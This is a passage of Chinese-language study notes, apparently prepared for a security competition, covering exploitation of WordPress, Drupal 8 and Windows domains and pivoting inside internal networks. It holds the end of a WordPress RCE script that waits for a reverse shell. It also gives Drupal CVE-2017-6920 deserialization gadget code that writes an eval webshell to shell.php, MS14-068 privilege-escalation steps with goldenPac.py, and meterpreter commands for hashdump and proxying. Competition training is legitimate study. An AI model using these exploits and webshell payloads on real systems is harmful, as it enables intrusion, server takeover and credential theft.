data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;curl -H&#34;Host: $host_header&#34; -d &#39;user_login=galigigi&amp;amp;wp-submit=Get+New+Password&#39; $target/wp-login.php?action=lostpassword &amp;amp;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo -e &#34;\n\e [92m [+]\033 [0m Payload executed!&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo -e &#34;\n\e [92m [*]\033 [0m Waiting for the target to send us a \e [94mreverse shell\e [0m...\n&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;echo &#34;Exiting...&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;exit 0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;drupal8-rce&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#drupal8-rce&#34;&gt;#&lt;/a&gt; Drupal8 RCE&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;CVE-2017-6920&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;影响 Drupal8 core 8.3.3&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;yaml 扩展导致的反序列化漏洞&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;需要后台登陆&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;yamlparse()&lt;/code&gt;  可以传参数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过 &lt;code&gt;!php/object&lt;/code&gt;  来声明一个节点，以 &lt;code&gt;unserialize&lt;/code&gt;  方式处理&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;需要安装 yaml 扩展&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;外部可控输入点 ConfigSingleImportForm.php 引入配置&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;步骤&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;寻找可以利用的类&lt;/li&gt;
&lt;li&gt;FileCookieJar.php 写入 webshell&lt;/li&gt;
&lt;li&gt;WindowsPipes.php 任意文件删除&lt;/li&gt;
&lt;li&gt;FnStream.php 无参数函数执行&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;token package&#34;&gt;GuzzleHttp&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;Psr7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name-definition class-name&#34;&gt;FnStream&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-hint&#34;&gt;array&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$methods&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;methods&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$methods&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// Create the functions on the class&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$methods&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$fn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;_fn_&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$fn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;_fn_close&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token function&#34;&gt;call_user_func&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;_fn_close&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$fn&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;FnStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;close&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;phpinfo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$fn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;!php/object &#34;O:24:\&#34;GuzzleHttp\\Psr7\\FnStream\&#34;:2:{s:33:\&#34;\0GuzzleHttp\\Psr7\\FnStream\0methods\&#34;;a:1:{s:5:\&#34;close\&#34;;s:7:\&#34;phpinfo\&#34;;}s:9:\&#34;_fn_close\&#34;;s:7:\&#34;phpinfo\&#34;;}&#34;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/2.10_1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$cookie_jar = new FileCookieJar(&#34;/var/www/html/drupal8/shell.php&#34;);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$cookie = array(&#34;a&#34; =&amp;gt; &#34;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;$&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;.&#34;&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&#34;,&#34;Name&#34; =&amp;gt; &#34;123a&#34;, &#34;Value&#34; =&amp;gt; &#39;0&#39;, &#34;Domain&#34; =&amp;gt; &#39;a&#39;, &#39;Path&#39; =&amp;gt; &#39;a&#39;, &#39;Expires&#39; =&amp;gt; 123456);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ab = new SetCookie($cookie);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$asb = $cookie_jar-&amp;gt;setCookie($ab);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;file_put_contents(&#34;ddd&#34;,addslashes(serialize($cookie_jar)));&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;先登录&lt;/p&gt;
&lt;p&gt;漏洞触发点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/admin/config/development/configuration/single/import&lt;/li&gt;
&lt;li&gt;之后添加 payload 即可&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;域权限提升漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域权限提升漏洞&#34;&gt;#&lt;/a&gt; 域权限提升漏洞&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;MS14-068&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过普通用户用户伪造凭证登录管理员机器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;需要条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;普通域的用户名和密码&lt;/li&gt;
&lt;li&gt;域控的域名&lt;/li&gt;
&lt;li&gt;时间日期同步&lt;/li&gt;
&lt;li&gt;dns 指向域内的 dns 或修改 hosts 文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;apt-get install krb-user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nmap ip -p445 --script=smb-os-discovery&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;年月日和时间都需要同步&lt;/p&gt;
&lt;p&gt;&lt;code&gt;net time -S &amp;lt;ip&amp;gt;&lt;/code&gt;  确认域时间&lt;/p&gt;
&lt;p&gt;&lt;code&gt;date -s&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2dsb2RlblBhYy5weQ==&#34;&gt;glodenPac.py&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;-target-ip -dc-ip&lt;/p&gt;
&lt;p&gt;&lt;code&gt;domain.com/kaka (用户名):Bomb123 (密码)@&amp;lt;域控主机名 (前面通过 nmap 扫出来的 FQDN)&amp;gt;.domain.com&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;相关链接:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ms14-068&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vYmxvZy9kaWdnaW5nLWludG8tbXMxNC0wNjgtZXhwbG9pdGF0aW9uLWFuZC1kZWZlbmNlLw==&#34;&gt;https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudHJ1c3RlZHNlYy5jb20vMjAxNC8xMi9tczE0LTA2OC1mdWxsLWNvbXByb21pc2Utc3RlcC1zdGVwLw==&#34;&gt;https://www.trustedsec.com/2014/12/ms14-068-full-compromise-step-step/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzU2MDgxLmh0bWw=&#34;&gt;http://www.freebuf.com/vuls/56081.html&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Wordpres RCE&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9leHBsb2l0Ym94LmlvL3Z1bG4vV29yZFByZXNzLUV4cGxvaXQtNC02LVJDRS1DT0RFLUVYRUMtQ1ZFLTIwMTYtMTAwMzMuaHRtbA==&#34;&gt;https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Drupal8&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzMzNC8/c3BtPTUxNzYxNzc1NTg4NS4yLjI1b0hVNjM=&#34;&gt;https://paper.seebug.org/334/?spm=517617755885.2.25oHU63&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;211-真题解析之内网渗透知识及工具使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#211-真题解析之内网渗透知识及工具使用&#34;&gt;#&lt;/a&gt; 2.11 真题解析之内网渗透知识及工具使用&lt;/h1&gt;
&lt;p&gt;企业赛代理工具和 msf&lt;/p&gt;
&lt;h2 id=&#34;代理工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代理工具&#34;&gt;#&lt;/a&gt; 代理工具&lt;/h2&gt;
&lt;h3 id=&#34;socks-proxychains-ew-的使用转发&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#socks-proxychains-ew-的使用转发&#34;&gt;#&lt;/a&gt; socks、proxychains、ew 的使用转发&lt;/h3&gt;
&lt;p&gt;参考上面 2.8 的内网转发基础&lt;/p&gt;
&lt;h3 id=&#34;ssh-端口转发&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh-端口转发&#34;&gt;#&lt;/a&gt; ssh 端口转发&lt;/h3&gt;
&lt;p&gt;ssh：加密客户端和服务端的通讯数据、突破防火墙的限制&lt;/p&gt;
&lt;h4 id=&#34;本地端口转发-攻击机上执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#本地端口转发-攻击机上执行&#34;&gt;#&lt;/a&gt; 本地端口转发 (攻击机上执行)&lt;/h4&gt;
&lt;p&gt;Hacker = &amp;gt; A = &amp;gt; B&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ssh -Nf -L &amp;lt;本机地址 (可省略)&amp;gt;:&amp;lt; 本机端口 &amp;gt;:&amp;lt; 目标 B 地址 &amp;gt;:&amp;lt; 目标 B 端口 &amp;gt; 跳板 IP (A)&lt;/li&gt;
&lt;li&gt;-N 为不执行命令 -f 为后台执行&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;远程端口转发-在跳板机-a-上执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#远程端口转发-在跳板机-a-上执行&#34;&gt;#&lt;/a&gt; 远程端口转发 (在跳板机 A 上执行)&lt;/h3&gt;
&lt;p&gt;Hacker = &amp;gt; A = &amp;gt; B&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ssh -Nf -R &amp;lt;攻击机 IP&amp;gt;:&amp;lt; 攻击机端口 &amp;gt;:&amp;lt; 目标 B 地址 &amp;gt;:&amp;lt; 目标 B 端口 &amp;gt; 攻击机 IP&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;适用于防火墙情况不能从攻击机直接连接 A，但是 A 可以回连&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;动态端口转发-在攻击机上执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#动态端口转发-在攻击机上执行&#34;&gt;#&lt;/a&gt; 动态端口转发 (在攻击机上执行)&lt;/h3&gt;
&lt;p&gt;Hacker = &amp;gt; A = &amp;gt; B&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ssh -Nf -D &amp;lt;攻击机 IP&amp;gt;:&amp;lt; 攻击机端口 &amp;gt; &amp;lt; 跳板机 A 的 IP 地址 &amp;gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;不需要制定目标的端口和 IP 获得完全的访问&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;web-端代理工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-端代理工具&#34;&gt;#&lt;/a&gt; web 端代理工具&lt;/h3&gt;
&lt;h4 id=&#34;regeorg-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#regeorg-2&#34;&gt;#&lt;/a&gt; reGeorg&lt;/h4&gt;
&lt;p&gt;见 2.8&lt;/p&gt;
&lt;h3 id=&#34;windows-端代理工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows-端代理工具&#34;&gt;#&lt;/a&gt; windows 端代理工具&lt;/h3&gt;
&lt;h4 id=&#34;proxifier&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#proxifier&#34;&gt;#&lt;/a&gt; Proxifier&lt;/h4&gt;
&lt;h4 id=&#34;cknife&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cknife&#34;&gt;#&lt;/a&gt; Cknife&lt;/h4&gt;
&lt;h2 id=&#34;merasploit&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#merasploit&#34;&gt;#&lt;/a&gt; Merasploit&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;集成渗透测试框架&lt;/li&gt;
&lt;li&gt;meterpreter
&lt;ul&gt;
&lt;li&gt;migrate 迁移进程&lt;/li&gt;
&lt;li&gt;hashdump 收集用户 hash&lt;/li&gt;
&lt;li&gt;ipconfig 查询网卡信息&lt;/li&gt;
&lt;li&gt;run getgui -e 开启 33889 远程桌面端口&lt;/li&gt;
&lt;li&gt;run autoroute -s 网段 添加后，可以将代理架设出来
&lt;ul&gt;
&lt;li&gt;use auxiliary/server/socks_proxy 默认监听本地的 1080 端口 (使用的是 socks5)&lt;/li&gt;
&lt;li&gt;使用 run 之后，代理便架设了，然后使用 proxychains 就可以使用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;内网扫描
&lt;ul&gt;
&lt;li&gt;use auxiliary/scanner/portscan/tcp&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;端口转发
&lt;ul&gt;
&lt;li&gt;portfwd add -l 7777 -p 80 (目标机) -r ip (目标机)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用代理
&lt;ul&gt;
&lt;li&gt;set proxies socks5: 代理的 IP&lt;/li&gt;
&lt;li&gt;设置代理之后不能设置 reverse 类型的 payload，可以设置 set payload windows/x64/meterpreter/bind_tcp&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;212-铁三-数据分析赛&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#212-铁三-数据分析赛&#34;&gt;#&lt;/a&gt; 2.12 铁三 - 数据分析赛&lt;/h1&gt;
&lt;p&gt;可能题目：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;路由器或交换机的品牌或型号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;攻击方法&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;时间&lt;/p&gt;
&lt;/li&gt;
